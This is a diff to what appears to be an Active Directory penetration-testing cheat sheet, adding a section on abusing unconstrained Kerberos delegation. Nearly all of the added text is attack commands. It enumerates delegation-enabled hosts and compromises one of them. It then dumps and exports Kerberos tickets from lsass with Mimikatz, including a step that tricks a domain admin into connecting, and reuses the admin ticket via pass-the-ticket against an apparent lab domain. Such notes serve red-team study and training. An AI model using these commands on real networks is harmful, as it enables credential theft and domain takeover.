@@ -595,3 +595,31 @@ Once TGS with Delegation enabled is received by the service machine, the TGT ext
 
 #### Unconstrained Delegation
 NOTE: Domain Controllers will always report as having delegation enabled.
+
+```Get-DomainComputer -UnConstrained```
+
+OR Using ActiveDirectory module:
+
+```Get-ADComputer -Filter {TrustedForDelegation -eq $True}```
+
+```Get-ADUser -Filter {TrustedForDelegation -eq $True}```
+
+#### Compromise the server(s) where unconstrained delegation is enabled 
+```Enter-PSSesstion -ComputerName appsrv01```
+```Find-LocalAdminAccess```
+```Invoke-UserHunter -ComputerName appsrv01 -Poll 100 -UserName Administrator -Delay 5 -verbose```
+
+#### Dump creds 
+See if theres any interesting accounts already resident in lsass:
+
+```Invoke-Mimikatz –Command '"sekurlsa::tickets"'```
+
+We must trick or wait for a domain admin to connect to a service on the compromised host and then dump the creds:
+
+```Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'```
+
+We can then reuse the DA token:
+
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
